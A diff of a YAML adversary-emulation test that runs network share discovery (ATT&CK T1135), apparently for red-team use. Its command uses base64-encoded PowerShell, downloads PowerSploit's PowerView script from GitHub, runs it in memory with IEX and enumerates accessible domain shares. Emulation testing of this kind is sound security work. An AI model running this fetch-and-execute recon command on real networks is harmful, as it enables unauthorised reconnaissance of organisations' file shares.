@@ -1,17 +1,15 @@
-- id: 2be220e4-4aee-5571-9c8d-aa051df96f36
+- requirements: []
   name: Soumaia ART Tests - Share Discovery with PowerView
   description: Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.
   tactic: discovery
-  technique:
-    attack_id: T1135
-    name: Network Share Discovery
-  platforms:
-    windows:
-      psh:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACAAKAAoAEcAZQB0AC0AVwBtAGkATwBiAGoAZQBjAHQAIAAtAEMAbABhAHMAcwAgAFcAaQBuADMAMgBfAEMAbwBtAHAAdQB0AGUAcgBTAHkAcwB0AGUAbQApAC4AUABhAHIAdABvAGYARABvAG0AYQBpAG4AKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand IgBKAG8AaQBuACAAcwB5AHMAdABlAG0AIAB0AG8AIABkAG8AbQBhAGkAbgAiAAoA
-          }
-          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
+  technique_id: T1135
+  technique_name: Network Share Discovery
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKAAoAEcAZQB0AC0AVwBtAGkATwBiAGoAZQBjAHQAIAAtAEMAbABhAHMAcwAgAFcAaQBuADMAMgBfAEMAbwBtAHAAdQB0AGUAcgBTAHkAcwB0AGUAbQApAC4AUABhAHIAdABvAGYARABvAG0AYQBpAG4AKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand IgBKAG8AaQBuACAAcwB5AHMAdABlAG0AIAB0AG8AIABkAG8AbQBhAGkAbgAiAAoA }; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
+  id: 2be220e4-4aee-5571-9c8d-aa051df96f36
